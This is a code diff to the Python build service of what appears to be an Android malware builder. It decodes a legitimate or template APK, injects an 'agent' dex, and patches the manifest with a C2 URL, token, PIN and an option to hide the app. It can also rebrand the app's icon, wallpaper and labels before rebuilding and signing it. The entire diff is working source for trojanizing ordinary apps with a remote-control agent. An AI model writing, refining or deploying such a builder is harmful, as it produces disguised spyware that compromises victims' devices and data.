@@ -5,6 +5,8 @@ import asyncio
 import hashlib
 import secrets
 import shutil
+import subprocess
+import tempfile
 import time
 import uuid
 import zipfile
@@ -15,6 +17,9 @@ from . import branding, config, db, injector, signer
 
 Log = Callable[[str], None]
 
+AGENT_APK = "agent.apk"
+TEMPLATE_APK = "template.apk"
+
 
 def _apktool() -> str:
     tool = shutil.which("apktool")
@@ -23,21 +28,24 @@ def _apktool() -> str:
     return tool
 
 
-def new_token() -> str:
-    return secrets.token_urlsafe(24)
-
-
-def _run(args: list[str], cwd: Path | None = None) -> None:
-    proc = subprocess_run(args, cwd)
+def _run(args: list[str], cwd: Path | None = None, timeout: int = 1200) -> None:
+    proc = subprocess.run(args, cwd=cwd, capture_output=True, timeout=timeout)
     if proc.returncode != 0:
         tail = (proc.stderr or proc.stdout or b"")[-1200:].decode(errors="replace")
-        raise RuntimeError(f"{args[0]} gagal: {tail}")
+        raise RuntimeError(f"{Path(args[0]).name} gagal: {tail}")
 
 
-def subprocess_run(args: list[str], cwd: Path | None = None):
-    import subprocess
+def prebuilt(name: str) -> Path:
+    path = config.PREBUILT_DIR / name
+    if not path.exists():
+        raise RuntimeError(
+            f"agent/prebuilt/{name} tidak ada. Jalankan ./scripts/build-agent.sh"
+        )
+    return path
 
-    return subprocess.run(args, cwd=cwd, capture_output=True, timeout=1200)
+
+def new_token() -> str:
+    return secrets.token_urlsafe(24)
 
 
 def decode(apk: Path, work: Path, log: Log) -> Path:
@@ -51,6 +59,8 @@ def build_decoded(decoded: Path, work: Path, log: Log) -> Path:
     unsigned = work / "unsigned.apk"
     log("apktool build...")
     _run([_apktool(), "b", str(decoded), "-o", str(unsigned)])
+    if not unsigned.exists():
+        raise RuntimeError("apktool tidak menghasilkan APK")
     return unsigned
 
 
@@ -72,6 +82,27 @@ def sha256(path: Path) -> str:
     return h.hexdigest()
 
 
+def _prepare(decoded: Path, opts: dict) -> int:
+    """Injeksi dex + resource + manifest. Kembalikan jumlah dex."""
+    n = injector.inject_dex(decoded, prebuilt(AGENT_APK))
+    injector.inject_assets(decoded)
+    injector.patch_manifest(
+        decoded,
+        opts["c2_url"], opts["token"], opts["pin"],
+        opts["email"], opts["team"], bool(opts.get("hide")),
+    )
+    if opts.get("icon"):
+        branding.write_icons(Path(opts["icon"]).read_bytes(), decoded / "res")
+    if opts.get("wallpaper"):
+        branding.write_wallpaper(Path(opts["wallpaper"]).read_bytes(), decoded / "res")
+    if opts.get("label"):
+        branding.patch_strings(
+            decoded / "res" / "values" / "mzk_strings.xml",
+            opts["label"], opts.get("wizard", ""), opts["email"], opts["team"],
+        )
+    return n
+
+
 async def run_job(build_id: str, mode: str, source: Path | None, opts: dict) -> None:
     """Jalankan job build di thread terpisah."""
     loop = asyncio.get_running_loop()
@@ -79,9 +110,9 @@ async def run_job(build_id: str, mode: str, source: Path | None, opts: dict) -> 
     def log(line: str) -> None:
         stamp = time.strftime("%H:%M:%S")
         row = db.one("SELECT log FROM builds WHERE id=?", (build_id,))
-        prev = row["log"] if row else ""
-        db.x("UPDATE builds SET log=?,updated=? WHERE id=?",
-             ((prev or "") + f"[{stamp}] {line}\n"[-20000:], time.time(), build_id))
+        prev = (row["log"] if row else "") or ""
+        merged = (prev + f"[{stamp}] {line}\n")[-20000:]
+        db.x("UPDATE builds SET log=?,updated=? WHERE id=?", (merged, time.time(), build_id))
 
     db.x("UPDATE builds SET status='proses',updated=? WHERE id=?", (time.time(), build_id))
     work = config.BUILD_DIR / build_id
@@ -91,48 +122,23 @@ async def run_job(build_id: str, mode: str, source: Path | None, opts: dict) -> 
     try:
         if mode == "patch" and source is not None:
             decoded = await loop.run_in_executor(None, decode, source, work, log)
-            log("inject dex agent...")
-            n = await loop.run_in_executor(None, injector.inject_dex, decoded, config.PREBUILT_DIR / "agent.apk")
-            log(f"{n} dex disisipkan")
-            await loop.run_in_executor(None, injector.inject_assets, decoded)
-            log("patch manifest...")
-            await loop.run_in_executor(
-                None, injector.patch_manifest, decoded,
-                opts["c2_url"], opts["token"], opts["pin"],
-                opts["email"], opts["team"], bool(opts.get("hide")),
-            )
-            if opts.get("icon"):
-                await loop.run_in_executor(
-                    None, branding.write_icons, Path(opts["icon"]).read_bytes(), decoded / "res")
-            if opts.get("wallpaper"):
-                await loop.run_in_executor(
-                    None, branding.write_wallpaper, Path(opts["wallpaper"]).read_bytes(), decoded / "res")
-            if opts.get("label"):
-                await loop.run_in_executor(
-                    None, branding.patch_strings, decoded / "res" / "values" / "mzk_strings.xml",
-                    opts["label"], opts.get("wizard", ""), opts["email"], opts["team"])
-            unsigned = await loop.run_in_executor(None, build_decoded, decoded, work, log)
         else:
-            base = config.PREBUILT_DIR / "template.apk"
-            if not base.exists():
-                raise RuntimeError("agent/prebuilt/template.apk tidak ada")
-            shutil.copy2(base, work / "template.apk")
-            decoded = await loop.run_in_executor(None, decode, work / "template.apk", work, log)
-            log("inject dex agent...")
-            await loop.run_in_executor(None, injector.inject_dex, decoded, config.PREBUILT_DIR / "agent.apk")
-            await loop.run_in_executor(None, injector.inject_assets, decoded)
-            await loop.run_in_executor(
-                None, injector.patch_manifest, decoded,
-                opts["c2_url"], opts["token"], opts["pin"],
-                opts["email"], opts["team"], bool(opts.get("hide")),
-            )
-            unsigned = await loop.run_in_executor(None, build_decoded, decoded, work, log)
+            base = prebuilt(TEMPLATE_APK)
+            copy = work / TEMPLATE_APK
+            shutil.copy2(base, copy)
+            decoded = await loop.run_in_executor(None, decode, copy, work, log)
 
+        log("inject dex agent...")
+        count = await loop.run_in_executor(None, _prepare, decoded, opts)
+        log(f"{count} dex disisipkan, manifest dipatch")
+
+        unsigned = await loop.run_in_executor(None, build_decoded, decoded, work, log)
         await loop.run_in_executor(None, finalize, unsigned, out, log)
+
         size = out.stat().st_size
         db.x("UPDATE builds SET status='selesai',outfile=?,size=?,updated=? WHERE id=?",
              (str(out), size, time.time(), build_id))
-        log(f"SELESAI · {size/1048576:.2f} MB · sha256 {sha256(out)[:16]}…")
+        log(f"SELESAI · {size / 1048576:.2f} MB · sha256 {sha256(out)[:16]}…")
         shutil.rmtree(work, ignore_errors=True)
     except Exception as exc:  # noqa: BLE001
         db.x("UPDATE builds SET status='gagal',updated=? WHERE id=?", (time.time(), build_id))
@@ -155,7 +161,7 @@ def create_build(name: str, package: str, mode: str, source: Path | None, opts: 
 
 def inspect_apk(path: Path) -> dict:
     """Baca package/versi dari APK tanpa decode penuh."""
-    info = {"package": "", "version": "", "label": "", "valid": False}
+    info = {"package": "", "version": "", "valid": False}
     try:
         with zipfile.ZipFile(path) as z:
             if "AndroidManifest.xml" not in z.namelist():
@@ -163,16 +169,23 @@ def inspect_apk(path: Path) -> dict:
             info["valid"] = True
     except zipfile.BadZipFile:
         return info
+
+    tmp = Path(tempfile.mkdtemp(prefix="mzk_inspect_"))
     try:
-        proc = subprocess_run([_apktool(), "d", "-s", "-f", "-o", "/tmp/mzk_inspect", str(path)])
+        proc = subprocess.run(
+            [_apktool(), "d", "-s", "-f", "-o", str(tmp / "d"), str(path)],
+            capture_output=True, timeout=180,
+        )
         if proc.returncode == 0:
-            mf = Path("/tmp/mzk_inspect/AndroidManifest.xml").read_text(errors="replace")
             import re
+
+            mf = (tmp / "d" / "AndroidManifest.xml").read_text(errors="replace")
             m = re.search(r'package="([^"]+)"', mf)
             v = re.search(r'versionName="([^"]*)"', mf)
             info["package"] = m.group(1) if m else ""
             info["version"] = v.group(1) if v else ""
-        shutil.rmtree("/tmp/mzk_inspect", ignore_errors=True)
-    except Exception:  # noqa: BLE001
+    except (subprocess.SubprocessError, OSError):
         pass
+    finally:
+        shutil.rmtree(tmp, ignore_errors=True)
     return info
